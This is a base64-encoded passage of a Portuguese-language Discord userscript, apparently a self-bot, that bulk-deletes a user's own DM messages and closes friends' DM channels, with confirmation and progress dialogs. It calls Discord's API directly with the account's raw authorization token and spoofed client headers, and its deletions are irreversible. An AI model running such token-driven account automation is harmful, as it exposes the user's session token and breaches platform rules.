ZW1vdmVDaGlsZChpZnJhbWUpOwogICAgICAgIHJldHVybiBpZD8ucmVwbGFjZSgvIi9nLCAnJykgfHwgbnVsbDsKICAgIH07CgogICAgY29uc3QgZGVsZXRlQWxsTWVzc2FnZXMgPSBhc3luYyAodXNlcklkLCB1c2VyTmFtZSkgPT4gewogICAgICAgIHNob3dDb25maXJtTW9kYWwoYFRlbSBjZXJ0ZXphIHF1ZSBkZXNlamEgYXBhZ2FyIFRPREFTIGFzIHN1YXMgbWVuc2FnZW5zIGNvbSAke3VzZXJOYW1lfT88YnI+PGJyPkVzc2EgYcOnw6NvIG7Do28gcG9kZSBzZXIgZGVzZmVpdGEhYCwgYXN5bmMgKCkgPT4gewogICAgICAgICAgICBjb25zdCBjYW5jZWxTdGF0ZSA9IHsgY2FuY2VsbGVkOiBmYWxzZSB9OwogICAgICAgICAgICBjb25zdCBwcm9ncmVzc01vZGFsID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7CiAgICAgICAgICAgIHByb2dyZXNzTW9kYWwuY2xhc3NOYW1lID0gJ2RmbS1tb2RhbCc7CiAgICAgICAgICAgIHByb2dyZXNzTW9kYWwuaW5uZXJIVE1MID0gYAogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLW1vZGFsLWNvbnRlbnQiPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1tb2RhbC10aXRsZSI+QXBhZ2FuZG8gTWVuc2FnZW5zPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXByb2dyZXNzLWNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1wcm9ncmVzcy10ZXh0IiBpZD0icHJvZ3Jlc3MtdGV4dCI+RXNjYW5lYW5kbyBtZW5zYWdlbnMuLi48L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXByb2dyZXNzLWJhci1jb250YWluZXIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXByb2dyZXNzLWJhciIgaWQ9InByb2dyZXNzLWJhciI+PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1wcm9ncmVzcy1hY3Rpb25zIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLWJ0bi1jYW5jZWwiIGlkPSJjYW5jZWwtb3BlcmF0aW9uIj5DYW5jZWxhcjwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIGA7CiAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocHJvZ3Jlc3NNb2RhbCk7CgogICAgICAgICAgICBjb25zdCBwcm9ncmVzc1RleHQgPSBwcm9ncmVzc01vZGFsLnF1ZXJ5U2VsZWN0b3IoJyNwcm9ncmVzcy10ZXh0Jyk7CiAgICAgICAgICAgIGNvbnN0IHByb2dyZXNzQmFyID0gcHJvZ3Jlc3NNb2RhbC5xdWVyeVNlbGVjdG9yKCcjcHJvZ3Jlc3MtYmFyJyk7CiAgICAgICAgICAgIGNvbnN0IGNhbmNlbEJ0biA9IHByb2dyZXNzTW9kYWwucXVlcnlTZWxlY3RvcignI2NhbmNlbC1vcGVyYXRpb24nKTsKCiAgICAgICAgICAgIGNhbmNlbEJ0bi5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsKICAgICAgICAgICAgICAgIGNhbmNlbFN0YXRlLmNhbmNlbGxlZCA9IHRydWU7CiAgICAgICAgICAgICAgICBjYW5jZWxCdG4uZGlzYWJsZWQgPSB0cnVlOwogICAgICAgICAgICAgICAgY2FuY2VsQnRuLnRleHRDb250ZW50ID0gJ0NhbmNlbGFuZG8uLi4nOwogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIGNvbnN0IGN1cnJlbnRVc2VySWQgPSBnZXRDdXJyZW50VXNlcklkKCk7CiAgICAgICAgICAgIGNvbnN0IGNoYW5uZWxJZCA9IGF3YWl0IGdldENoYW5uZWxJZCh1c2VySWQpOwogICAgICAgICAgICBjb25zdCBtZXNzYWdlSWRzID0gW107CiAgICAgICAgICAgIGxldCBsYXN0TWVzc2FnZUlkID0gbnVsbDsKCiAgICAgICAgICAgIHdoaWxlICh0cnVlKSB7CiAgICAgICAgICAgICAgICBpZiAoY2FuY2VsU3RhdGUuY2FuY2VsbGVkKSBicmVhazsKICAgICAgICAgICAgICAgIGNvbnN0IG1lc3NhZ2VzID0gYXdhaXQgZmV0Y2hNZXNzYWdlcyhjaGFubmVsSWQsIGxhc3RNZXNzYWdlSWQpOwogICAgICAgICAgICAgICAgaWYgKCFtZXNzYWdlcy5sZW5ndGgpIGJyZWFrOwogICAgICAgICAgICAgICAgZm9yIChjb25zdCBtc2cgb2YgbWVzc2FnZXMpIHsKICAgICAgICAgICAgICAgICAgICBpZiAobXNnLmF1dGhvci5pZCA9PT0gY3VycmVudFVzZXJJZCkgbWVzc2FnZUlkcy5wdXNoKG1zZy5pZCk7CiAgICAgICAgICAgICAgICAgICAgbGFzdE1lc3NhZ2VJZCA9IG1zZy5pZDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHByb2dyZXNzVGV4dC50ZXh0Q29udGVudCA9IGAke21lc3NhZ2VJZHMubGVuZ3RofSBtZW5zYWdlbnMgZW5jb250cmFkYXMuLi5gOwogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoY2FuY2VsU3RhdGUuY2FuY2VsbGVkKSB7CiAgICAgICAgICAgICAgICBwcm9ncmVzc01vZGFsLnJlbW92ZSgpOwogICAgICAgICAgICAgICAgc2hvd05vdGlmaWNhdGlvbignT3BlcmHDp8OjbyBjYW5jZWxhZGEhJywgJ3dhcm5pbmcnKTsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYgKCFtZXNzYWdlSWRzLmxlbmd0aCkgewogICAgICAgICAgICAgICAgcHJvZ3Jlc3NNb2RhbC5yZW1vdmUoKTsKICAgICAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oJ05lbmh1bWEgbWVuc2FnZW0gZW5jb250cmFkYScsICdpbmZvJyk7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGxldCBkZWxldGVkQ291bnQgPSAwOwoKICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBtZXNzYWdlSWRzLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgICBpZiAoY2FuY2VsU3RhdGUuY2FuY2VsbGVkKSBicmVhazsKICAgICAgICAgICAgICAgIGlmIChhd2FpdCBkZWxldGVNZXNzYWdlKGNoYW5uZWxJZCwgbWVzc2FnZUlkc1tpXSkpIGRlbGV0ZWRDb3VudCsrOwogICAgICAgICAgICAgICAgY29uc3QgcGVyY2VudCA9ICgoaSArIDEpIC8gbWVzc2FnZUlkcy5sZW5ndGgpICogMTAwOwogICAgICAgICAgICAgICAgcHJvZ3Jlc3NUZXh0LnRleHRDb250ZW50ID0gYEFwYWdhbmRvICR7ZGVsZXRlZENvdW50fS8ke21lc3NhZ2VJZHMubGVuZ3RofSBtZW5zYWdlbnNgOwogICAgICAgICAgICAgICAgcHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSBgJHtwZXJjZW50fSVgOwogICAgICAgICAgICAgICAgYXdhaXQgbmV3IFByb21pc2UociA9PiBzZXRUaW1lb3V0KHIsIHJlcXVlc3REZWxheSkpOwogICAgICAgICAgICB9CgogICAgICAgICAgICBwcm9ncmVzc01vZGFsLnJlbW92ZSgpOwogICAgICAgICAgICBpZiAoY2FuY2VsU3RhdGUuY2FuY2VsbGVkKSB7CiAgICAgICAgICAgICAgICBzaG93Tm90aWZpY2F0aW9uKGBDYW5jZWxhZG8hICR7ZGVsZXRlZENvdW50fSBtZW5zYWdlbnMgZm9yYW0gYXBhZ2FkYXMuYCwgJ3dhcm5pbmcnKTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oYCR7ZGVsZXRlZENvdW50fSBtZW5zYWdlbnMgYXBhZ2FkYXMhYCwgJ3N1Y2Nlc3MnKTsKICAgICAgICAgICAgfQogICAgICAgIH0pOwogICAgfTsKCiAgICBjb25zdCBkZWxldGVNZXNzYWdlc0J5VXNlcklkID0gYXN5bmMgKHVzZXJJZCkgPT4gewogICAgICAgIGlmICghdXNlcklkIHx8IHVzZXJJZC50cmltKCkgPT09ICcnKSB7CiAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oJ0RpZ2l0ZSB1bSBJRCBkZSB1c3XDoXJpbyB2w6FsaWRvIScsICd3YXJuaW5nJyk7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CgogICAgICAgIHNob3dDb25maXJtTW9kYWwoYFRlbSBjZXJ0ZXphIHF1ZSBkZXNlamEgYXBhZ2FyIFRPREFTIGFzIHN1YXMgbWVuc2FnZW5zIGNvbSBvIHVzdcOhcmlvIElEOiAke3VzZXJJZH0/PGJyPjxicj5Fc3NhIGHDp8OjbyBuw6NvIHBvZGUgc2VyIGRlc2ZlaXRhIWAsIGFzeW5jICgpID0+IHsKICAgICAgICAgICAgY29uc3QgY2FuY2VsU3RhdGUgPSB7IGNhbmNlbGxlZDogZmFsc2UgfTsKICAgICAgICAgICAgY29uc3QgcHJvZ3Jlc3NNb2RhbCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwogICAgICAgICAgICBwcm9ncmVzc01vZGFsLmNsYXNzTmFtZSA9ICdkZm0tbW9kYWwnOwogICAgICAgICAgICBwcm9ncmVzc01vZGFsLmlubmVySFRNTCA9IGAKICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1tb2RhbC1jb250ZW50Ij4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tbW9kYWwtdGl0bGUiPkFwYWdhbmRvIE1lbnNhZ2VuczwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1wcm9ncmVzcy1jb250YWluZXIiPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tcHJvZ3Jlc3MtdGV4dCIgaWQ9InByb2dyZXNzLXRleHQiPk9idGVuZG8gY2FuYWwuLi48L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXByb2dyZXNzLWJhci1jb250YWluZXIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXByb2dyZXNzLWJhciIgaWQ9InByb2dyZXNzLWJhciI+PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1wcm9ncmVzcy1hY3Rpb25zIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLWJ0bi1jYW5jZWwiIGlkPSJjYW5jZWwtb3BlcmF0aW9uIj5DYW5jZWxhcjwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIGA7CiAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocHJvZ3Jlc3NNb2RhbCk7CgogICAgICAgICAgICBjb25zdCBwcm9ncmVzc1RleHQgPSBwcm9ncmVzc01vZGFsLnF1ZXJ5U2VsZWN0b3IoJyNwcm9ncmVzcy10ZXh0Jyk7CiAgICAgICAgICAgIGNvbnN0IHByb2dyZXNzQmFyID0gcHJvZ3Jlc3NNb2RhbC5xdWVyeVNlbGVjdG9yKCcjcHJvZ3Jlc3MtYmFyJyk7CiAgICAgICAgICAgIGNvbnN0IGNhbmNlbEJ0biA9IHByb2dyZXNzTW9kYWwucXVlcnlTZWxlY3RvcignI2NhbmNlbC1vcGVyYXRpb24nKTsKCiAgICAgICAgICAgIGNhbmNlbEJ0bi5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsKICAgICAgICAgICAgICAgIGNhbmNlbFN0YXRlLmNhbmNlbGxlZCA9IHRydWU7CiAgICAgICAgICAgICAgICBjYW5jZWxCdG4uZGlzYWJsZWQgPSB0cnVlOwogICAgICAgICAgICAgICAgY2FuY2VsQnRuLnRleHRDb250ZW50ID0gJ0NhbmNlbGFuZG8uLi4nOwogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBjb25zdCBjdXJyZW50VXNlcklkID0gZ2V0Q3VycmVudFVzZXJJZCgpOwogICAgICAgICAgICAgICAgY29uc3QgY2hhbm5lbElkID0gYXdhaXQgZ2V0Q2hhbm5lbElkKHVzZXJJZC50cmltKCkpOwoKICAgICAgICAgICAgICAgIGlmICghY2hhbm5lbElkKSB7CiAgICAgICAgICAgICAgICAgICAgcHJvZ3Jlc3NNb2RhbC5yZW1vdmUoKTsKICAgICAgICAgICAgICAgICAgICBzaG93Tm90aWZpY2F0aW9uKCdOw6NvIGZvaSBwb3Nzw612ZWwgZW5jb250cmFyIGEgY29udmVyc2EgY29tIGVzdGUgdXN1w6FyaW8nLCAnZXJyb3InKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgcHJvZ3Jlc3NUZXh0LnRleHRDb250ZW50ID0gJ0VzY2FuZWFuZG8gbWVuc2FnZW5zLi4uJzsKICAgICAgICAgICAgICAgIGNvbnN0IG1lc3NhZ2VJZHMgPSBbXTsKICAgICAgICAgICAgICAgIGxldCBsYXN0TWVzc2FnZUlkID0gbnVsbDsKCiAgICAgICAgICAgICAgICB3aGlsZSAodHJ1ZSkgewogICAgICAgICAgICAgICAgICAgIGlmIChjYW5jZWxTdGF0ZS5jYW5jZWxsZWQpIGJyZWFrOwogICAgICAgICAgICAgICAgICAgIGNvbnN0IG1lc3NhZ2VzID0gYXdhaXQgZmV0Y2hNZXNzYWdlcyhjaGFubmVsSWQsIGxhc3RNZXNzYWdlSWQpOwogICAgICAgICAgICAgICAgICAgIGlmICghbWVzc2FnZXMubGVuZ3RoKSBicmVhazsKICAgICAgICAgICAgICAgICAgICBmb3IgKGNvbnN0IG1zZyBvZiBtZXNzYWdlcykgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAobXNnLmF1dGhvci5pZCA9PT0gY3VycmVudFVzZXJJZCkgbWVzc2FnZUlkcy5wdXNoKG1zZy5pZCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGxhc3RNZXNzYWdlSWQgPSBtc2cuaWQ7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHByb2dyZXNzVGV4dC50ZXh0Q29udGVudCA9IGAke21lc3NhZ2VJZHMubGVuZ3RofSBtZW5zYWdlbnMgZW5jb250cmFkYXMuLi5gOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmIChjYW5jZWxTdGF0ZS5jYW5jZWxsZWQpIHsKICAgICAgICAgICAgICAgICAgICBwcm9ncmVzc01vZGFsLnJlbW92ZSgpOwogICAgICAgICAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oJ09wZXJhw6fDo28gY2FuY2VsYWRhIScsICd3YXJuaW5nJyk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmICghbWVzc2FnZUlkcy5sZW5ndGgpIHsKICAgICAgICAgICAgICAgICAgICBwcm9ncmVzc01vZGFsLnJlbW92ZSgpOwogICAgICAgICAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oJ05lbmh1bWEgbWVuc2FnZW0gc3VhIGVuY29udHJhZGEgbmVzdGEgY29udmVyc2EnLCAnaW5mbycpOwogICAgICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBsZXQgZGVsZXRlZENvdW50ID0gMDsKCiAgICAgICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IG1lc3NhZ2VJZHMubGVuZ3RoOyBpKyspIHsKICAgICAgICAgICAgICAgICAgICBpZiAoY2FuY2VsU3RhdGUuY2FuY2VsbGVkKSBicmVhazsKICAgICAgICAgICAgICAgICAgICBpZiAoYXdhaXQgZGVsZXRlTWVzc2FnZShjaGFubmVsSWQsIG1lc3NhZ2VJZHNbaV0pKSBkZWxldGVkQ291bnQrKzsKICAgICAgICAgICAgICAgICAgICBjb25zdCBwZXJjZW50ID0gKChpICsgMSkgLyBtZXNzYWdlSWRzLmxlbmd0aCkgKiAxMDA7CiAgICAgICAgICAgICAgICAgICAgcHJvZ3Jlc3NUZXh0LnRleHRDb250ZW50ID0gYEFwYWdhbmRvICR7ZGVsZXRlZENvdW50fS8ke21lc3NhZ2VJZHMubGVuZ3RofSBtZW5zYWdlbnNgOwogICAgICAgICAgICAgICAgICAgIHByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gYCR7cGVyY2VudH0lYDsKICAgICAgICAgICAgICAgICAgICBhd2FpdCBuZXcgUHJvbWlzZShyID0+IHNldFRpbWVvdXQociwgcmVxdWVzdERlbGF5KSk7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgcHJvZ3Jlc3NNb2RhbC5yZW1vdmUoKTsKICAgICAgICAgICAgICAgIGlmIChjYW5jZWxTdGF0ZS5jYW5jZWxsZWQpIHsKICAgICAgICAgICAgICAgICAgICBzaG93Tm90aWZpY2F0aW9uKGBDYW5jZWxhZG8hICR7ZGVsZXRlZENvdW50fSBtZW5zYWdlbnMgZm9yYW0gYXBhZ2FkYXMuYCwgJ3dhcm5pbmcnKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgc2hvd05vdGlmaWNhdGlvbihgJHtkZWxldGVkQ291bnR9IG1lbnNhZ2VucyBhcGFnYWRhcyFgLCAnc3VjY2VzcycpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgICAgICAgICAgcHJvZ3Jlc3NNb2RhbC5yZW1vdmUoKTsKICAgICAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oJ0Vycm8gYW8gZGVsZXRhciBtZW5zYWdlbnMnLCAnZXJyb3InKTsKICAgICAgICAgICAgfQogICAgICAgIH0pOwogICAgfTsKCiAgICBjb25zdCBjbG9zZURNQ2hhbm5lbCA9IGFzeW5jICh1c2VySWQpID0+IHsKICAgICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGZldGNoKCdodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS91c2Vycy9AbWUvY2hhbm5lbHMnLCB7CiAgICAgICAgICAgIGhlYWRlcnM6IHsKICAgICAgICAgICAgICAgICdhdXRob3JpemF0aW9uJzogdG9rZW4sCiAgICAgICAgICAgICAgICAnY29udGVudC10eXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLAogICAgICAgICAgICAgICAgJ3gtc3VwZXItcHJvcGVydGllcyc6IHhTdXBlclByb3BlcnRpZXMKICAgICAgICAgICAgfSwKICAgICAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkoeyByZWNpcGllbnRzOiBbdXNlcklkXSB9KSwKICAgICAgICAgICAgbWV0aG9kOiAnUE9TVCcKICAgICAgICB9KTsKICAgICAgICBjb25zdCBkYXRhID0gYXdhaXQgcmVzcG9uc2UuanNvbigpOwogICAgICAgIGNvbnN0IGNoYW5uZWxJZCA9IGRhdGEuaWQ7CgogICAgICAgIGlmIChjaGFubmVsSWQpIHsKICAgICAgICAgICAgYXdhaXQgZmV0Y2goYGh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L2NoYW5uZWxzLyR7Y2hhbm5lbElkfT9zaWxlbnQ9ZmFsc2VgLCB7CiAgICAgICAgICAgICAgICBoZWFkZXJzOiB7CiAgICAgICAgICAgICAgICAgICAgJ2F1dGhvcml6YXRpb24nOiB0b2tlbiwKICAgICAgICAgICAgICAgICAgICAneC1zdXBlci1wcm9wZXJ0aWVzJzogeFN1cGVyUHJvcGVydGllcwogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIG1ldGhvZDogJ0RFTEVURScKICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgIH0KICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9OwoKICAgIGNvbnN0IGNsb3NlQWxsRnJpZW5kc0RNcyA9IGFzeW5jICgpID0+IHsKICAgICAgICBjb25zdCBmcmllbmRzID0gYXdhaXQgZmV0Y2hGcmllbmRzKCk7CiAgICAgICAgY29uc3QgZnJpZW5kc0xpc3QgPSBmcmllbmRzLmZpbHRlcihmID0+IGYudHlwZSA9PT0gMSk7CgogICAgICAgIGlmICghZnJpZW5kc0xpc3QubGVuZ3RoKSB7CiAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oJ05lbmh1bSBhbWlnbyBlbmNvbnRyYWRvIScsICd3YXJuaW5nJyk7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CgogICAgICAgIHNob3dDb25maXJtTW9kYWwoYFRlbSBjZXJ0ZXphIHF1ZSBkZXNlamEgRkVDSEFSIHRvZGFzIGFzICR7ZnJpZW5kc0xpc3QubGVuZ3RofSBETXMgZGUgYW1pZ29zPzxicj48YnI+SXNzbyBuw6NvIGFwYWdhIGFzIG1lbnNhZ2VucywgYXBlbmFzIGZlY2hhIG9zIGNhbmFpcyBkZSBjb252ZXJzYS5gLCBhc3luYyAoKSA9PiB7CiAgICAgICAgICAgIGNvbnN0IGNhbmNlbFN0YXRlID0geyBjYW5jZWxsZWQ6IGZhbHNlIH07CiAgICAgICAgICAgIGNvbnN0IHByb2dyZXNzTW9kYWwgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsKICAgICAgICAgICAgcHJvZ3Jlc3NNb2RhbC5jbGFzc05hbWUgPSAnZGZtLW1vZGFsJzsKICAgICAgICAgICAgcHJvZ3Jlc3NNb2RhbC5pbm5lckhUTUwgPSBgCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tbW9kYWwtY29udGVudCI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLW1vZGFsLXRpdGxlIj5GZWNoYW5kbyBETXM8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tcHJvZ3Jlc3MtY29udGFpbmVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXByb2dyZXNzLXRleHQiIGlkPSJwcm9ncmVzcy10ZXh0Ij5JbmljaWFuZG8uLi48L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXByb2dyZXNzLWJhci1jb250YWluZXIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXByb2dyZXNzLWJhciIgaWQ9InByb2dyZXNzLWJhciI+PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1wcm9ncmVzcy1hY3Rpb25zIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLWJ0bi1jYW5jZWwiIGlkPSJjYW5jZWwtb3BlcmF0aW9uIj5DYW5jZWxhcjwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIGA7CiAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocHJvZ3Jlc3NNb2RhbCk7CgogICAgICAgICAgICBjb25zdCBwcm9ncmVzc1RleHQgPSBwcm9ncmVzc01vZGFsLnF1ZXJ5U2VsZWN0b3IoJyNwcm9ncmVzcy10ZXh0Jyk7CiAgICAgICAgICAgIGNvbnN0IHByb2dyZXNzQmFyID0gcHJvZ3Jlc3NNb2RhbC5xdWVyeVNlbGVjdG9yKCcjcHJvZ3Jlc3MtYmFyJyk7CiAgICAgICAgICAgIGNvbnN0IGNhbmNlbEJ0biA9IHByb2dyZXNzTW9kYWwucXVlcnlTZWxlY3RvcignI2NhbmNlbC1vcGVyYXRpb24nKTsKICAgICAgICAgICAgbGV0IGNsb3NlZENvdW50ID0gMDsKCiAgICAgICAgICAgIGNhbmNlbEJ0bi5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsKICAgICAgICAgICAgICAgIGNhbmNlbFN0YXRlLmNhbmNlbGxlZCA9IHRydWU7CiAgICAgICAgICAgICAgICBjYW5jZWxCdG4uZGlzYWJsZWQgPSB0cnVlOwogICAgICAgICAgICAgICAgY2FuY2VsQnRuLnRleHRDb250ZW50ID0gJ0NhbmNlbGFuZG8uLi4nOwogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgZnJpZW5kc0xpc3QubGVuZ3RoOyBpKyspIHsKICAgICAgICAgICAgICAgIGlmIChjYW5jZWxTdGF0ZS5jYW5jZWxsZWQpIGJyZWFrOwogICAgICAgICAgICAgICAgY29uc3QgZnJpZW5kID0gZnJpZW5kc0xpc3RbaV07CiAgICAgICAgICAgICAgICBjb25zdCBmcmllbmROYW1lID0gZnJpZW5kLnVzZXIuZ2xvYmFsX25hbWUgfHwgZnJpZW5kLnVzZXIudXNlcm5hbWU7CgogICAgICAgICAgICAgICAgcHJvZ3Jlc3NUZXh0LnRleHRDb250ZW50ID0gYEZlY2hhbmRvIERNOiAke2ZyaWVuZE5hbWV9ICgke2kgKyAxfS8ke2ZyaWVuZHNMaXN0Lmxlbmd0aH0pYDsKCiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIGNvbnN0IHN1Y2Nlc3MgPSBhd2FpdCBjbG9zZURNQ2hhbm5lbChmcmllbmQuaWQpOwogICAgICAgICAgICAgICAgICAgIGlmIChzdWNjZXNzKSBjbG9zZWRDb3VudCsrOwogICAgICAgICAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKGBFcnJvIGFvIGZlY2hhciBETSBjb20gJHtmcmllbmROYW1lfTpgLCBlcnJvcik7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgY29uc3QgcGVyY2VudCA9ICgoaSArIDEpIC8gZnJpZW5kc0xpc3QubGVuZ3RoKSAqIDEwMDsKICAgICAgICAgICAgICAgIHByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gYCR7cGVyY2VudH0lYDsKICAgICAgICAgICAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHIgPT4gc2V0VGltZW91dChyLCByZXF1ZXN0RGVsYXkpKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgcHJvZ3Jlc3NNb2RhbC5yZW1vdmUoKTsKICAgICAgICAgICAgaWYgKGNhbmNlbFN0YXRlLmNhbmNlbGxlZCkgewogICAgICAgICAgICAgICAgc2hvd05vdGlmaWNhdGlvbihgQ2FuY2VsYWRvISAke2Nsb3NlZENvdW50fSBETXMgZm9yYW0gZmVjaGFkYXMuYCwgJ3dhcm5pbmcnKTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oYCR7Y2xvc2VkQ291bnR9IERNcyBmZWNoYWRhcyBjb20gc3VjZXNzbyFgLCAnc3VjY2VzcycpOwogICAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICB9OwoKICAgIGNvbnN0IHNob3dDb25maXJtTW9kYWwgPSAobWVzc2FnZSwgb25Db25maXJtKSA9PiB7CiAgICAgICAgY29uc3QgbW9kYWwgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsKICAgICAgICBtb2RhbC5jbGFzc05hbWUgPSAnZGZtLW1vZGFsJzsKICAgICAgICBtb2RhbC5pbm5lckhUTUwgPSBgCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1tb2RhbC1jb250ZW50Ij4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1tb2RhbC10aXRsZSI+Q29uZmlybWHDp8OjbzwvZGl2PgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLW1vZGFsLXRleHQiPiR7bWVzc2FnZX08L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1tb2RhbC1hY3Rpb25zIj4KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJkZm0tYnRuIHNlY29uZGFyeSIgaWQ9ImNhbmNlbCI+Q2FuY2VsYXI8L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICA8YnV0dG9u